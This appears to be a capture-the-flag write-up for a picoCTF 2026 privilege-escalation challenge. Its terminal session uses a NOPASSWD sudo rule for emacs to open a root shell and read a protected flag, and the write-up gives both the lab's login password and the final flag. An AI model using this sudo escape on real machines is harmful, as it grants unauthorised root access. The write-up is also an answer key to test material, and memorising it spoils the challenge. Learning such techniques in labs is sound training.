@@ -1,0 +1,77 @@
+SUDO MAKE ME A SANDWICH
+General Skills
+Easy
+by Darkraicg492
+·
+picoCTF 2026
+Can you read the flag? I think you can! ssh -p 31477 ctf-player@chatelaine.cylabacademy.net using password ab5721f2
+
+Solution:
+
+┌──(kali㉿kali)-[~/Desktop/picoCTF 2026/General Skills/SUDO MAKE ME A SANDWICH]
+└─$ ssh -p 11758 ctf-player@xebec.cylabacademy.net
+The authenticity of host '[xebec.cylabacademy.net]:11758 ([3.14.181.178]:11758)' can't be established.
+ED25519 key fingerprint is SHA256:CizFACv90/ZG42XZjL2rD11H6dfp3lsCtzNCEnS/gr8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[xebec.cylabacademy.net]:11758' (ED25519) to the list of known hosts.
+ctf-player@xebec.cylabacademy.net's password: 
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 7.0.0-1013-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+ctf-player@challenge:~$ ls
+flag.txt
+ctf-player@challenge:~$ cat flag.txt 
+cat: flag.txt: Permission denied
+ctf-player@challenge:~$ sudo su
+[sudo] password for ctf-player: 
+Sorry, user ctf-player is not allowed to execute '/usr/bin/su' as root on challenge.
+ctf-player@challenge:~$ whoami
+ctf-player
+ctf-player@challenge:~$ id
+uid=1001(ctf-player) gid=1001(ctf-player) groups=1001(ctf-player)
+ctf-player@challenge:~$ sudo -l
+Matching Defaults entries for ctf-player on challenge:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User ctf-player may run the following commands on challenge:
+    (ALL) NOPASSWD: /bin/emacs
+ctf-player@challenge:~$ sudo /bin/emacs
+
+Inside Emacs, press:
+Esc
+
+then press:
+x
+
+At the bottom, you should see:
+M-x
+
+Type:
+shell
+
+and press Enter.
+
+File Edit Options Buffers Tools Complete In/Out Signals Help                                                                                                                     
+root@challenge:/home/ctf-player# whoami
+root
+root@challenge:/home/ctf-player# ls
+flag.txt
+root@challenge:/home/ctf-player# cat flag.txt
+
+academy{ju57_5ud0_17_ac1a398c}
